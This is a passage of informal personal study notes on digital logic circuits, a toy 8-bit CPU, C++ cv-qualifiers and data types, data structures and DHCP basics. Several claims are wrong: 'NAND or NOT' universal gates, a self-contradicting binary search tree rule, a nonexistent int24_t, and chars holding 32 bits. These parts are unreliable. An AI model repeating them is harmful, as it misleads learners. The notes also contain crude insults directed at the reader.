<li>Dynamic: <data class="katex-src" value="P_{dynamic} = \frac{1}{2}C\cdot \left(V_{DD}\right)^2"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>d</mi><mi>y</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>i</mi><mi>c</mi></mrow></msub><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mi>C</mi><mo>⋅</mo><msup><mrow><mo fence="true">(</mo><msub><mi>V</mi><mrow><mi>D</mi><mi>D</mi></mrow></msub><mo fence="true">)</mo></mrow><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">P_{dynamic} = \frac{1}{2}C\cdot \left(V_{DD}\right)^2</annotation></semantics></math></span></data>.</li>
<li>Static is due to leakage current, dynamic due to inherent capacitance of the gates.</li>
</ul>
<h2 id="boolean-algebra"><a class="header" href="#boolean-algebra">Boolean Algebra</a></h2>
<h3 id="minterms"><a class="header" href="#minterms">Minterms</a></h3>
<ul>
<li>Sum of products of all possible combinations that appear in the input. Eg. <data class="katex-src" value="\overline{A}BC + \overline{A}\ \overline{B}C + AB\overline{C}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>A</mi><mo stretchy="true">‾</mo></mover><mi>B</mi><mi>C</mi><mo>+</mo><mover accent="true"><mi>A</mi><mo stretchy="true">‾</mo></mover><mtext> </mtext><mover accent="true"><mi>B</mi><mo stretchy="true">‾</mo></mover><mi>C</mi><mo>+</mo><mi>A</mi><mi>B</mi><mover accent="true"><mi>C</mi><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{A}BC + \overline{A}\ \overline{B}C + AB\overline{C}</annotation></semantics></math></span></data></li>
<li>Each minterm is one particular row in the truth table.</li>
<li>For any function, find all possible minterms for which the function is true.</li>
<li>The function is the sum of all those minterms, This is also called <em>Sum Of Products</em> (SOP).</li>
<li>Since the order of truth table is known, we can represent them as numbers alone. Start with all <strong>FALSE</strong>, then binary increment them.</li>
<li>A not of any variable is take as a 0, otherwise it is take as a 1. This will give you the row number of that minterm (0 indexed).</li>
<li>Finally <data class="katex-src" value="f=\Sigma m\left(n_1,n_2,\dots \right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo>=</mo><mi mathvariant="normal">Σ</mi><mi>m</mi><mrow><mo fence="true">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>n</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mtext> </mtext><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">f=\Sigma m\left(n_1,n_2,\dots \right)</annotation></semantics></math></span></data></li>
</ul>
<h3 id="maxterms"><a class="header" href="#maxterms">Maxterms</a></h3>
<ul>
<li>Exactly the opposite of above, we take the rows that are <strong>FALSE</strong> for the output. For each row, we sum the terms together instead of multiplying them.</li>
<li>Then we multiply all the sums together. This is called (no shit) <em>Products Of Sums</em> (POS).</li>
<li>Enumeration is done in the same way as that of SOP. For shorthand notation, use M instead of m.</li>
</ul>
<h3 id="universal-gates"><a class="header" href="#universal-gates">Universal gates</a></h3>
<ul>
<li>Any boolean function can be written entirely in terms of either one of NAND or NOT gates.</li>
</ul>
<h3 id="boolean-logic-simplification"><a class="header" href="#boolean-logic-simplification">Boolean Logic simplification</a></h3>
<p>KMaps:</p>
<p>For 4 bits,</p>
<div class="table-wrapper"><table><thead><tr><th></th><th>AB</th><th>A~B</th><th>~A~B</th><th>~AB</th></tr></thead><tbody>
<tr><td>CD</td><td>Item2.1</td><td>Item3.1</td><td>Item4.1</td><td>Item5.1</td></tr>
<tr><td>C~D</td><td>Item2.2</td><td>Item3.2</td><td>Item4.2</td><td>Item5.2</td></tr>
<tr><td>~C~D</td><td>Item2.3</td><td>Item3.3</td><td>Item4.3</td><td>Item5.3</td></tr>
<tr><td>~CD</td><td>Item2.3</td><td>Item3.3</td><td>Item4.3</td><td>Item5.3</td></tr>
</tbody></table>
</div>
<ul>
<li>Circle as big rectangles as possible whose dimensions are powers of two.</li>
<li>Keep check of wrap arounds.</li>
<li>Take <em>don’t cares</em> in if they increase the size of the block otherwise don’t.</li>
</ul>
<h2 id="combinational-circuits"><a class="header" href="#combinational-circuits">Combinational circuits</a></h2>
<h3 id="comparators"><a class="header" href="#comparators">Comparators</a></h3>
<ul>
<li>Use NXOR for comparing two numbers.</li>
<li>If two bits are equal, their NXOR is 1.</li>
<li>So for equality bitwise NXOR the two numbers.</li>
<li>If A is greater than B, then there are cases:
<ul>
<li>The first bit of A is greater than the first bit of B. <data class="katex-src" value="A_0\overline{B_0}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>0</mn></msub><mover accent="true"><msub><mi>B</mi><mn>0</mn></msub><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">A_0\overline{B_0}</annotation></semantics></math></span></data> will be 1.</li>
<li>The first bit is equal and the second bit of A is greater than the second bit of B. <data class="katex-src" value="\left(A_0B_0 + \overline{A_0}\ \overline{B_0}\right)\left(A_1\overline{B_1}\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">(</mo><msub><mi>A</mi><mn>0</mn></msub><msub><mi>B</mi><mn>0</mn></msub><mo>+</mo><mover accent="true"><msub><mi>A</mi><mn>0</mn></msub><mo stretchy="true">‾</mo></mover><mtext> </mtext><mover accent="true"><msub><mi>B</mi><mn>0</mn></msub><mo stretchy="true">‾</mo></mover><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><msub><mi>A</mi><mn>1</mn></msub><mover accent="true"><msub><mi>B</mi><mn>1</mn></msub><mo stretchy="true">‾</mo></mover><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\left(A_0B_0 + \overline{A_0}\ \overline{B_0}\right)\left(A_1\overline{B_1}\right)</annotation></semantics></math></span></data></li>
<li>The first two bits are equal and the third bit of A is greater than the third bit of B. We can see that the pattern can be easily extended.</li>
</ul>
</li>
</ul>
<h3 id="decoder"><a class="header" href="#decoder">Decoder</a></h3>
<ul>
<li>N:2<sup>N</sup>. Basically creating minterms out of the given bits.</li>
</ul>
<h3 id="encoder"><a class="header" href="#encoder">Encoder</a></h3>
<ul>
<li>Given N inputs, out of which only one is active, output its bits. This works properly only if one of the bits is active.</li>
<li>Use KMaps to make the truth tables for the output lines. Basically check for which numbers the output lines become active and OR them accordingly.</li>
</ul>
<h4 id="priority-encoders"><a class="header" href="#priority-encoders">Priority encoders</a></h4>
<ul>
<li>To resolve the issue of multiple terms being active in an encoder, use <em>don’t care</em> conditions in the KMaps.</li>
<li>Basically we don’t care what the output at that instance will be. We can choose it according to our own convenience.</li>
</ul>
<h3 id="multiplexer"><a class="header" href="#multiplexer">Multiplexer</a></h3>
<ul>
<li>Select one of the N inputs using <data class="katex-src" value="\log_2{N}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>N</mi></mrow><annotation encoding="application/x-tex">\log_2{N}</annotation></semantics></math></span></data> selection lines.</li>
<li>If the inputs are A and B, and the A has to be selected when S is 0, the output is <data class="katex-src" value="A\overline{S} + BS"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mover accent="true"><mi>S</mi><mo stretchy="true">‾</mo></mover><mo>+</mo><mi>B</mi><mi>S</mi></mrow><annotation encoding="application/x-tex">A\overline{S} + BS</annotation></semantics></math></span></data>. Logic can similarly be extended for and power of two.</li>
<li>Treat the selection lines as the bits of the inputs. The first is the least significant and the last is the most significant.</li>
</ul>
<h3 id="adder"><a class="header" href="#adder">Adder</a></h3>
<ul>
<li>1 bit half adder:
<ul>
<li>Sum = <data class="katex-src" value="A \oplus B"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>⊕</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">A \oplus B</annotation></semantics></math></span></data></li>
<li>Carry out = <data class="katex-src" value="AB"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">AB</annotation></semantics></math></span></data></li>
</ul>
</li>
<li>bit full adder:
<ul>
<li>Carry out = <data class="katex-src" value="AB + BC + AC"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>B</mi><mo>+</mo><mi>B</mi><mi>C</mi><mo>+</mo><mi>A</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">AB + BC + AC</annotation></semantics></math></span></data> (C is carry in)</li>
<li>Sum = <data class="katex-src" value="A\oplus B\oplus C"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>⊕</mo><mi>B</mi><mo>⊕</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">A\oplus B\oplus C</annotation></semantics></math></span></data></li>
<li>pass the carry out from the i’th bit to the carry in of the (i+1)’th bit.</li>
</ul>
</li>
</ul>
<p>For subtraction of two numbers, just add the 1’s complement of the number that is to be subtracted and add 1.</p>
<h2 id="sequential-circuits"><a class="header" href="#sequential-circuits">Sequential circuits</a></h2>
<blockquote>
<ul>
<li>Latches and flip-flops have 10+ transistors per bit.</li>
<li>SRAM has 6 mosfets/transistors per bit.</li>
<li>DRAM has 1 transistor + 1 capacitor per cell.</li>
<li>Non-volatile storage: no transistors. Yay!</li>
</ul>
</blockquote>
<h3 id="r-s-latches"><a class="header" href="#r-s-latches">R-S Latches</a></h3>
<p><img src="notes/./csd/3.png" alt="R-S latch" /></p>
<ul>
<li>R = 1, S = 1: previous state is held.</li>
<li>10 sets Q to 1.</li>
<li>01 sets Q to 0.</li>
<li>00 is a forbidden state (race condition, infinite toggling)</li>
<li>Q<sub>NEXT</sub> is S’ + RQ</li>
</ul>
<h3 id="gated-d-latch"><a class="header" href="#gated-d-latch">Gated D Latch</a></h3>
<p><img src="notes/./csd/4.png" alt="Gated D latch" /></p>
<p>When <code>write-enable</code> is zero, it holds the previous value. When it is 1, it sets the value of Q equal to D.</p>
<h3 id="d-flip-flops"><a class="header" href="#d-flip-flops">D flip-flops</a></h3>
<p>Latches are retarded because they are level triggered. We want stuff to be edge triggered. Hence flip-flops. They are edge triggered enough to be suitable for most purposes and gives a singular time point (for all practical purposes it is a time point) when the flip flop does its action.</p>
<p><img src="notes/./csd/5.png" alt="the NOT gate has extremely slight delay" /></p>
<p>There is a slight delay in the NOT gate that is achieved with an RC circuit.</p>
<p>The rest of the circuit is the same as gated D latch. In both cases write-enable is connected to the clock with the only difference being in the triggering patterns and the extra circuitry involved in it.</p>
<h3 id="jk-flip-flops"><a class="header" href="#jk-flip-flops">JK flip-flops</a></h3>
<p>Pretty much the same as a R-S latch except with a write-enable feature and edge triggering.</p>
<p><img src="notes/./csd/6.png" alt="JK Flip Flop" /></p>
<p>There are 4 modes :</p>
<ul>
<li>JK == 00, hold the state</li>
<li>JK == 01, set Q to 0</li>
<li>JK == 10, set Q to 1</li>
<li>JK == 11, toggle the current value</li>
</ul>
<p>Unlike RS latch there will be on problem with toggling here because the clock pulse is too small for a race condition.</p>
<p>Excitation table: like truth table but tells you what the current JK / D configuration should be to obtain the desired next value.</p>
<ul>
<li>For a D flip-flop, the current D should be the next desired Q.</li>
<li>For an RS latch
<ul>
<li>if you want a 0 in the next state while current is 0, J should be 0. K can be anything.</li>
<li>if you want next to be 1 while current is 0, J should be 1. K can be anything.</li>
<li>if you want next to be 0 while current is 1, set K to 1. J can be anything.</li>
<li>if you want next to be 1 while current is 1, set K to 0. J can be anything.</li>
</ul>
</li>
</ul>
<h3 id="counters-and-frequency-dividers"><a class="header" href="#counters-and-frequency-dividers">Counters and frequency dividers</a></h3>
<ul>
<li>Down Counter: Does what you think it does</li>
</ul>
<p><img src="notes/./csd/7.png" alt="Down counter" /></p>
<ul>
<li>Frequency divider: for powers of 2, for other numbers use a mod counter</li>
</ul>
<p><img src="notes/./csd/8.png" alt="frequency divider" /></p>
<ul>
<li>Ring Counter: one hot encoded</li>
</ul>
<p><img src="notes/./csd/9.png" alt="ring counter states" /></p>
<p><img src="notes/./csd/10.png" alt="ring counter structure" /></p>
<ul>
<li>Johnson counter: <a href="https://en.wikipedia.org/wiki/Gray_code">Gray Code</a></li>
</ul>
<p><img src="notes/./csd/11.png" alt="Johnson counter pattern" /></p>
<p>Same as ring counter except <data class="katex-src" value="\overline{Q}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>Q</mi><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{Q}</annotation></semantics></math></span></data> is fed as input to the first one.</p>
<h3 id="registers-1"><a class="header" href="#registers-1">Registers</a></h3>
<p>Multiple flip-flops with the same write enable. Can hold multibit values.</p>
<p>A variant called shift register is used for bit shift operations within the register.</p>
<p><img src="notes/./csd/12.png" alt="parallel access shift register" /></p>
<h2 id="finite-state-machines"><a class="header" href="#finite-state-machines">Finite State Machines</a></h2>
<p>Five components:</p>
<ul>
<li>states</li>
<li>external inputs</li>
<li>external outputs</li>
<li>how all state transitions are determined</li>
<li>how all outputs are determined</li>
</ul>
<p>If there are 2<sup>k</sup> states, map them to k flip-flops and use the inputs to determine how the states and outputs change.</p>
<p>Two types:</p>
<ul>
<li>Moore: outputs depend only on the current state</li>
<li>Mealy: outputs depend only on the current state and the inputs</li>
</ul>
<h2 id="final-computer-architecture"><a class="header" href="#final-computer-architecture">Final Computer architecture</a></h2>
<p><img src="notes/./csd/13.png" alt="Gajendra 1 layout" /></p>
<p>8 bit instruction architecture. First 4 bits are instructions and last 4 are data.</p>
<div class="table-wrapper"><table><thead><tr><th>Assembly</th><th>Machine Code</th></tr></thead><tbody>
<tr><td>NOP</td><td>0x0</td></tr>
<tr><td>LDA</td><td>0x1</td></tr>
<tr><td>STA</td><td>0x2</td></tr>
<tr><td>ADD</td><td>0x3</td></tr>
<tr><td>SUB</td><td>0x4</td></tr>
<tr><td>LDI</td><td>0x5</td></tr>
<tr><td>JMP</td><td>0x6</td></tr>
<tr><td>OUT</td><td>0x7</td></tr>
<tr><td>JNZ</td><td>0x8</td></tr>
<tr><td>SWAP</td><td>0x9</td></tr>
<tr><td>HALT</td><td>0xF</td></tr>
</tbody></table>
</div>
<h3 id="basic-structure-of-all-commands"><a class="header" href="#basic-structure-of-all-commands">Basic structure of all commands</a></h3>
<h4 id="lda-load-from-address-into-reg-a"><a class="header" href="#lda-load-from-address-into-reg-a">LDA: Load from address into reg A</a></h4>
<p>4 T-States</p>
<p>First T-State takes the output of program counter and gives to the memory address register.</p>
<p><code>1 &lt;&lt; PC_OUT | 1 &lt;&lt; MAR_IN</code></p>
<p>Second takes the output of memory register and sends it to the instruction register. This is possible because MAR output is always connected to Memory input and as soon as MAR receives an input the memory starts pointing to the location saved in the MAR. Program counter is also incremented at this point to get the next instruction from memory.</p>
<p><code>1 &lt;&lt; PC_INC | 1 &lt;&lt; MEM_OUT | 1 &lt;&lt; IR_IN</code></p>
<p>These two T-States together constitute the fetch and mem-lookup cycle and are present for every control word.</p>
<p>The next two T-States are specific to LDA. The first takes the output of IR which has the memory address and sends it to MAR. The second one takes the output from memory and sends it to reg A.</p>
<p><code>1 &lt;&lt; IR_OUT | 1 &lt;&lt; MAR_IN</code></p>
<p><code>1 &lt;&lt; MEM_OUT | 1 &lt;&lt; RA_IN</code></p>
<h4 id="add-and-sub-load-into-reg-b-from-address-and-addsubtract-and-store-the-result-in-reg-a"><a class="header" href="#add-and-sub-load-into-reg-b-from-address-and-addsubtract-and-store-the-result-in-reg-a">ADD and SUB: Load into reg B from address and add/subtract and store the result in reg A</a></h4>
<p>First two T-States are the same.
Third is also same as LDA.
In the fourth one, the value is loaded to B instead of A.</p>
<p>At the end of second T-State, the IR has the instruction that is to be executed. That time, the output of IR is directly connected to the <strong>Instruction Decoder</strong>, that checks for the instruction and sends the appropriate action to the ALU.</p>
<p>So the ALU already knows what to do. Once the 4th T-State is over, the ALU has computed the result and just needs to output it.</p>
<p>Fifth T-State ensures that.</p>
<p><code>1 &lt;&lt; PC_OUT | 1 &lt;&lt; MAR_IN</code></p>
<p><code>1 &lt;&lt; PC_INC | 1 &lt;&lt; MEM_OUT | 1 &lt;&lt; IR_IN</code></p>
<p><code>1 &lt;&lt; IR_OUT | 1 &lt;&lt; MAR_IN</code></p>
<p><code>1 &lt;&lt; MEM_OUT | 1 &lt;&lt; RB_IN</code></p>
<p><code>1 &lt;&lt; ALU_OUT | 1 &lt;&lt; RA_IN</code></p>
<h4 id="nop-does-nothing-just-like-the-useless-piece-of-shit-you-are"><a class="header" href="#nop-does-nothing-just-like-the-useless-piece-of-shit-you-are">NOP: Does nothing just like the useless piece of shit you are</a></h4>
<p>Only has a fetch + mem_lookup cycle.</p>
<h3 id="software-based-control-logic"><a class="header" href="#software-based-control-logic">Software Based Control Logic</a></h3>
<p>For every instruction, there is a corresponding address where the T-State’s information is stored. For Gajendra-1 architecture, it is as follows:</p>
<ul>
<li>first bit is the flag. Comes from status reg.</li>
<li>next four bits are the instruction bits.</li>
<li>next three bits are the current T-State number.</li>
</ul>
<p>This gives the address of the control ROM where that T-State is stored.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cv_qualifiers"><a class="header" href="#cv_qualifiers">cv_qualifiers</a></h1>
<p><strong>cv_qualifiers</strong></p>
<p>Any thing that is const, or volatile, or both.</p>
<h2 id="top-level-cv_qualifiers"><a class="header" href="#top-level-cv_qualifiers">Top level cv_qualifiers</a></h2>
<p>What is <code>const int * x</code>. What is constant here, the pointer or the underlying data? It is the underlying data that is constant, the pointer can change its value to point to any other <code>const int</code>.</p>
<p>By extension, <code>int * const x</code> will have a pointer which can be dereferenced and the underlying data’s value can be changed, but the pointer itself cannot change to point to something else.</p>
<p>Here the second <code>const</code> is referred to as the top level cv-qualifier. Because it is a constness on the highest level, the pointer itself.</p>
<h2 id="references-cannot-have-top-level-cv-qualifiers"><a class="header" href="#references-cannot-have-top-level-cv-qualifiers">References cannot have top level cv-qualifiers</a></h2>
<p>A reference is not an object in itself. It is an <em>alias</em>, an alternative name for an object. Therefore there is no such thing as <code>int &amp; const x</code>. You cannot change what a reference is an alias for. However <code>const int &amp; x</code> is still valid as it is an alias to a <code>const int</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="data_structures"><a class="header" href="#data_structures">data_structures</a></h1>
<h2 id="linked-lists"><a class="header" href="#linked-lists">Linked Lists</a></h2>
<p>Yeah the good old. Can be singly linked lists, doubly, circular etc. Mostly the idea is to keep a decent brain while writing this stuff out.</p>
<h2 id="stack"><a class="header" href="#stack">Stack</a></h2>
<p>Last in first out. Can be made using an array by having a back pointer, that keeps moving back and forth as and when elements come up. Same with linked lists, have a pointer to the last node in the list and insert and remove accordingly.</p>
<h2 id="queue"><a class="header" href="#queue">Queue</a></h2>
<p>First in first out. Circular buffer. <code>first</code> points to an element that is empty and right behind the first filled element. <code>last</code> points to the position where the element is going to be filled next. One extra node is always kept empty.</p>
<ul>
<li>Empty: <code>last = (first + 1) % size</code></li>
<li>Full: <code>last = first</code></li>
</ul>
<h2 id="deque"><a class="header" href="#deque">Deque</a></h2>
<p>Basically a stack and queue together.</p>
<h2 id="trees"><a class="header" href="#trees">Trees</a></h2>
<p>A linked list with two pointers instead of one. Basically having a right child and a left child. Mostly class implementations will also be having a parent pointer.</p>
<ul>
<li>Full tree: Every node has 0 or 2 children.</li>
<li>Complete tree: Filled in level order fashion.</li>
<li>Perfect tree: 2<sup>n</sup> - 1</li>
</ul>
<h3 id="binary-search-tree"><a class="header" href="#binary-search-tree">Binary Search Tree</a></h3>
<p>All nodes on the right side of the current node are smaller in value than the current node. All on the right are greater than the current node.</p>
<ul>
<li>Balancing (AVL): Need to do a left rotate or a right rotate. Or a double rotate.</li>
</ul>
<h3 id="binary-heap"><a class="header" href="#binary-heap">Binary Heap</a></h3>
<p>The top element is the minimum or maximum. All the elements below one node are larger than it (or smaller than it).</p>
<h2 id="hash-tables"><a class="header" href="#hash-tables">Hash tables</a></h2>
<p>Basically an array. Takes a hash function (like modulo p) and insert it in the position of h(x). If there are collisions (two inputs having the same hash), there are two approaches to resolve this.</p>
<ul>
<li>
<p>Linked list: It is called something I can’t remember. Basically start inserting everything that collides into a linked list.</p>
</li>
<li>
<p>Probing: Not what you think it is. It has categories.</p>
<ul>
<li>Linear probing: if h(x) is filled, go to h(x) + 1 mod p. Keep going till you find a spot that is empty or deleted.</li>
<li>Quadratic probing: Go to h(x) + k<sup>2</sup> : if p is a prime, then you are guaranteed to find an empty bucket in p/2 probes.</li>
</ul>
</li>
</ul>
<p>If searching in the probing method, you get a cell that is deleted, then keep proceeding for the search. If you get a cell that is empty, however, the search should stop there because if the searched element was in the table, it would have occupied that one. Use an enum to keep track of full, empty and deleted.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="data-types"><a class="header" href="#data-types">Data Types</a></h1>
<ul>
<li><code>int</code>: Integer. At least as large as <code>short</code>. Usually 32 bits.</li>
<li><code>short</code>: Short integer. Usually 16 bits.</li>
<li><code>long</code>: Long integer. At least as large as <code>int</code>. Usually 32 bits.</li>
<li><code>long long</code>: Very long integer. At least as large as <code>long</code>. Usually 64 bits.</li>
</ul>
<blockquote>
<p>All these use <a href="https://en.wikipedia.org/wiki/Two%27s_complement">two’s complement</a>.</p>
</blockquote>
<ul>
<li><code>unsigned int</code>: Unsigned integer. At least as large as <code>unsigned short</code>. Usually 32 bits.</li>
<li><code>unsigned short</code>: Unsigned short integer. Usually 16 bits.</li>
<li><code>unsigned long</code>: Unsigned long integer. At least as large as <code>unsigned int</code>. Usually 32 bits.</li>
<li><code>unsigned long long</code>: Unsigned very long integer. At least as large as <code>unsigned long</code>. Usually 64 bits.</li>
</ul>
<blockquote>
<p>Same sizes as above; only that the ranges are modified and 2’s complement is absent.</p>
</blockquote>
<ul>
<li><code>signed char</code>: -128 to 127. ASCII characters only. Can actually store upto 32 bits.</li>
<li><code>unsigned char</code>: 0 to 255. ASCII characters only. Can actually store upto 32 bits.</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Escape Sequence</th><th style="text-align: center">Description</th></tr></thead><tbody>
<tr><td style="text-align: center">\n</td><td style="text-align: center">moves the cursor to the beginning of the next line</td></tr>
<tr><td style="text-align: center">\t</td><td style="text-align: center">tab</td></tr>
<tr><td style="text-align: center">\r</td><td style="text-align: center">Carriage return. Moves the cursor to the beginning of the line.</td></tr>
<tr><td style="text-align: center">\a</td><td style="text-align: center">Alerts the system bell</td></tr>
<tr><td style="text-align: center">\\</td><td style="text-align: center">Prints backslash</td></tr>
<tr><td style="text-align: center">\"</td><td style="text-align: center">Prints double quotes</td></tr>
<tr><td style="text-align: center">\f</td><td style="text-align: center">Goes to the line immediately below the cursor and gives a space</td></tr>
<tr><td style="text-align: center">\b</td><td style="text-align: center">Backspace</td></tr>
<tr><td style="text-align: center">\'</td><td style="text-align: center">single quote</td></tr>
<tr><td style="text-align: center">\0</td><td style="text-align: center">Null character; denotes end of string</td></tr>
<tr><td style="text-align: center">\v</td><td style="text-align: center">tab but in vertical direction</td></tr>
<tr><td style="text-align: center">\?</td><td style="text-align: center">print a question mark</td></tr>
<tr><td style="text-align: center">\117</td><td style="text-align: center">Octal code for characters</td></tr>
<tr><td style="text-align: center">\x45</td><td style="text-align: center">Hexadecimal code for characters</td></tr>
<tr><td style="text-align: center">\u20B9</td><td style="text-align: center">Unicode</td></tr>
</tbody></table>
</div>
<ul>
<li>
<p><code>float</code>: Floating point decimal number. Stores 32 bits.</p>
</li>
<li>
<p><code>double</code>: Same as <code>float</code> except it stores 64 bits.</p>
</li>
<li>
<p><code>long double</code>: Same as <code>double</code> except it stores 80 bits.</p>
</li>
</ul>
<blockquote>
<p><code>%d</code> for a <code>char</code> prints its ASCII value. If a <code>char</code> is defined as ‘ABC’, <code>%d</code> prints (ASCII<em>A)·256^2^ + (ASCII_B)·256 + (ASCII_C) where ASCII</em> is the ascii value for that character. <code>%c</code> only accesses the last (or first, depending on whether the processor is little Endian or big Endian) valid byte (i.e. <code>'C'</code> in this case). If the char is defined as <code>'ABCDE'</code>, only the last (or first, again depending on the processor) valid byte is processed and stored, and <code>%d</code> accesses all 4 bytes including the 3 following it, while <code>%c</code> works the same.</p>
</blockquote>
<p>However, there are fixed width integer types as well. All of them are included in <code>&lt;cstdint&gt;</code> header file.</p>
<p>They can be annotated using <code>uintN_t</code>, where <code>N</code> is the size of the integer. It must be a multiple of 8 to fit exact bytes.</p>
<p>Examples:</p>
<ul>
<li><code>uint64_t</code></li>
<li><code>int24_t</code></li>
<li><code>uint8_t</code></li>
</ul>
<p>They have macro constants as well for maximum and minimum values of some fixed sizes.</p>
<ul>
<li><code>INT8_MAX</code>/<code>INT8_MIN</code></li>
<li><code>INT16_MAX</code>/<code>INT16_MIN</code></li>
<li><code>INT32_MAX</code>/<code>INT32_MIN</code></li>
<li><code>INT64_MAX</code>/<code>INT64_MIN</code></li>
</ul>
<div class="epigraph"><blockquote><p> I made up the term 'object-oriented', and I can tell you I didn't have C++ in mind.</p><footer>
Alan Kay, <cite>OOPSLA '97</cite></footer></blockquote></div>
<h2 id="variable-declaration"><a class="header" href="#variable-declaration">Variable Declaration</a></h2>
<blockquote>
<p>Variables declared outside of main are global variables.</p>
</blockquote>
<p><code>data_type var</code> when the value is not known.</p>
<p><code>data_type var = value</code> when the value is known.</p>
<p>We can also use <code>typedef</code>.</p>
<p><code>typedef existing_name alias_name;</code></p>
<p>This is better than <code>#define</code> as it allows you typecast. Also, it acts as an object type rather than a simple macro and can be debugged.</p>
<p><code>enum var_type {val_1,val_2,val_3};</code> : This declares a new enumeration type. The default values are 0, 1, 2 and so on. We can also define variables of the <code>var_type</code> using <code>enum var_type {...} new_var;</code> or by:</p>
<pre><code class="language-cpp">enum var_type {val_1,val_2,val_3};
enum var_type var;
</code></pre>
<p>We can also define our own values using <code>enum var_type {var1 = 1,var_2 = 2};</code>.
If in between some values are undefined then their value is set as the previous value + 1.</p>
<ul>
<li>enum values must be integer constants or characters.</li>
</ul>
<h2 id="typecasting"><a class="header" href="#typecasting">Typecasting</a></h2>
<p>To typecast between two different types we use <code>static_cast&lt;type_to_be_casted_to&gt;(thing to cast)</code>. See <a href="https://en.cppreference.com/w/cpp/language/static_cast">this</a> for examples and when they work.</p>
<p>To typecast a <code>const</code> pointer to a non-<code>const</code> one use <code>const_cast</code>. Piece of advice, never use it.</p>
<p>There is another cast that is used to convert a pointer from one type to another. It is <code>dynamic_cast</code>. It performs a runtime check, as opposed to a compile time check in <code>static_cast</code>. It returns a <code>nullptr</code> in case failing to convert the given pointer.</p>
<h3 id="c-style-casts"><a class="header" href="#c-style-casts">C style casts:</a></h3>
<p><strong>Explicit:</strong> <code>(type_name) expression</code></p>
<p><strong>Implicit:</strong> <code>type_name new_var = expression</code></p>
<p>Implicit typecasting also occurs when we perform an operation between a lower level data type and a higher level data type. Eg. int &amp; float, int and long, float and double etc.</p>
<p>In all of the above examples, the first one gets typecasted to the second.</p>
<p>C - style casts may add a line of instruction or two, however, they are mostly supposed to be compile time. If you need C - style casts in your code you may use <a href="https://en.cppreference.com/w/cpp/language/reinterpret_cast">reinterpret cast</a></p>
<h2 id="external-variables"><a class="header" href="#external-variables">External Variables</a></h2>
<p><code>extern</code> is used for declaring a variable without defining it. It is basically tells the compiler there is something called that variable and it need not worry about it not being in scope. Also used to use <code>static global</code> vars in other files (<code>static</code> vars are file linked by default).</p>
<blockquote>
<p>Don’t use <code>extern</code>. Bad practice.</p>
</blockquote>
<div class="epigraph">
<blockquote><p> Christ, people. Learn C, instead of just stringing random characters together until it compiles (with warnings).</p>
<footer>Linus Torvalds, <cite>LKM mailing list</cite></footer></blockquote>
</div>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dhcp"><a class="header" href="#dhcp">dhcp</a></h1>
<ul>
<li>Used for automatically assigning IP addresses to devices.</li>
<li>Uses a client server architecture.</li>
</ul>
<h2 id="dynamic-allocation"><a class="header" href="#dynamic-allocation">Dynamic Allocation</a></h2>
<ul>
<li>Router gets a range from network admin. Each client requests an address during network initialization.</li>
<li>Uses a lease concept with a controllable time period, so router can reclaim and reallocate the IP address to some other device.</li>
</ul>
<h2 id="automatic-allocation"><a class="header" href="#automatic-allocation">Automatic Allocation</a></h2>
<ul>
<li>Like dynamic, but once an IP is allotted to a MAC address it is saved for the device.</li>
<li>It is preferential and not strict (ofc).</li>
</ul>
<h2 id="staticmanual-allocation"><a class="header" href="#staticmanual-allocation">Static/Manual Allocation</a></h2>
<ul>
<li>MAC address to IP mapping. May fall back to other methods if this fails.</li>
</ul>
<h2 id="modus-operandi"><a class="header" href="#modus-operandi">Modus Operandi</a></h2>
<ul>
<li>Uses UDP under the hood.</li>
<li>Server listens on port 67, client listens on port 68.</li>
</ul>
<h3 id="server-discovery"><a class="header" href="#server-discovery">Server discovery</a></h3>
<ul>
<li>Client broadcasts a <strong>DHCPDISCOVER</strong> message on the network subnet using destination address 255.255.255.255 or using the specific subnet broadcast address.</li>
<li>Client may also request for the previously offered.</li>
</ul>
<h3 id="offer-from-the-server"><a class="header" href="#offer-from-the-server">Offer from the server</a></h3>
<ul>
<li>IP address is reserved for the client.</li>
<li>A <strong>DHCPOFFER</strong> is sent to the client.</li>
